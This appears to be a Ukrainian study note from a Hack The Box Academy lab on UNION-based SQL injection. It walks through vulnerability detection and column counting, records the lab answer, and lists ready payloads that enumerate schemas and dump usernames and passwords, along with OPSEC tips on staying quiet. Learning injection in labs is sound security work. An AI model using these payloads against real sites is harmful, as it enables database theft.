# SQL Injection — UNION-based Injection

## Модуль
[SQL Injection Fundamentals — UNION Injection](https://academy.hackthebox.com/app/module/33/section/216)

## Концепція

**UNION-based SQLi** — витягування даних через додавання другого SELECT.
Результат відображається прямо на сторінці.

## Алгоритм

### Крок 1 — Виявлення вразливості
http://TARGET/search.php?port_code=cn'
→ SQL error = вразлива точка

### Крок 2 — Визначити кількість колонок (ORDER BY)
?port_code=cn' ORDER BY 1-- - → OK
?port_code=cn' ORDER BY 2-- - → OK
?port_code=cn' ORDER BY 3-- - → OK
?port_code=cn' ORDER BY 4-- - → OK
?port_code=cn' ORDER BY 5-- - → ERROR
→ таблиця має 4 колонки

### Крок 3 — Визначити які колонки відображаються
?port_code=cn' UNION select 1,user(),3,4-- -
→ root@localhost

**Відповідь:** `root@localhost`

---

## Корисні UNION payloads

```sql
-- Поточний юзер БД
' UNION select 1,user(),3,4-- -

-- Версія БД
' UNION select 1,@@version,3,4-- -

-- Поточна база даних
' UNION select 1,database(),3,4-- -

-- Datadir
' UNION select 1,@@datadir,3,4-- -

-- Список баз даних
' UNION select 1,schema_name,3,4 FROM information_schema.schemata-- -

-- Список таблиць
' UNION select 1,table_name,3,4 FROM information_schema.tables WHERE table_schema='dbname'-- -

-- Список колонок
' UNION select 1,column_name,3,4 FROM information_schema.columns WHERE table_name='tablename'-- -

-- Витягнути дані
' UNION select 1,username,password,4 FROM users-- -
```

## Визначення кількості колонок — обидва методи

| Метод | Payload | Ознака успіху |
|-------|---------|---------------|
| ORDER BY | `' ORDER BY N-- -` | Error на N+1 |
| UNION | `' UNION select 1,2,...N-- -` | Числа з'являються на сторінці |

## OPSEC нотатки

> - Завжди починай з `ORDER BY` — менш «шумний» ніж UNION перебір
> - Числа 1,2,3,4 як placeholder — легко відстежити що відображається
> - Прихована колонка (ID) — типово перша, inject в 2,3,4
